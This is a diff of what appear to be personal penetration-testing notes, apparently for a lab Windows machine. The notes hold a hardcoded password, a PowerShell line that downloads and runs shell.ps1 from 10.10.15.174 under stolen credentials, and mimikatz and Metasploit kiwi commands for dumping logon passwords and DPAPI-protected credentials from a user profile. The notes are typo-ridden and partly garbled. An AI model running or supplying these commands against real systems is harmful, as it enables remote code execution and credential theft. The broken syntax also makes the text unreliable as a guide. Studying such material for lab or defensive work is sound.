@@ -26,4 +26,25 @@ $password = 'access4u@security'
 
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+
 Start-Process IEX(New-Object net.webclient).downloadString('http://10.10.15.174/shell.ps1') -Credential $credential
+
+https://github.com/gentilkiwi/mimikatz/releases
+
+mimikatz
+msfconsole
+	kiwi_cmd  '"dpapi:
+
+// refenrence: harmj0y.net guidance for offsensive user dpapi-abuse
+mimikatz '"privilege::debug" "sekurlsa::logonpassword /user:please"'
+
+sid-- /user/security/appdata/Roamingh/Microsoft/Protect
+//download a file use *
+dowload 0*
+donwload 4*
+
+//download Credentials 
+cd c:\users\security\appdata\Roaming\Microsoft\Credentials
+
+use mimikatz.exe
+dpapi 
